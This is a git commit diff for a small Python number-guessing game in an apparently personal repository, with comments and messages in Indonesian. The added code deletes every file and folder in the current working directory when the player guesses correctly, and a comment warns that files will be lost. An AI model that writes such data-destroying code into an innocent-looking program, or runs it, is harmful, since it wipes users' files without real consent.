ef665ee192a87db7c8e683cba4a117c95f710751
Vann-Dev <stevanvincent05@gmail.com>
2023-12-04 11:02:45 +0700

    feat: game kematian

--- Code/python/tebakAngka.py
+++ Code/python/tebakAngka.py
@@ -1,10 +1,23 @@
+# INI JANGAN ASAL RUN KALO GA NGERTI, NTAR ILANG FILE, BUKAN SALAH GW
+
 import random
-import os
+import os, shutil
+
 angkaAcak = random.randrange(1, 6, 1)
+folder = os.getcwd()+'/'
 
-tebakan = int(input("Tebak angka "))
-
-if tebakan == angkaAcak:
-    print("Baby")
-
-os.remove(os.getcwd()+"/Code/python")
+while True:
+    tebakan = int(input("Tebak angka "))
+    
+    if tebakan == angkaAcak:
+        print("Babay")
+        for filename in os.listdir(folder):
+            file_path = os.path.join(folder, filename)
+            try:
+                if os.path.isfile(file_path) or os.path.islink(file_path):
+                    os.unlink(file_path)
+                elif os.path.isdir(file_path):
+                    shutil.rmtree(file_path)
+            except Exception as e:
+                print('Failed to delete %s. Reason: %s' % (file_path, e))
+        break
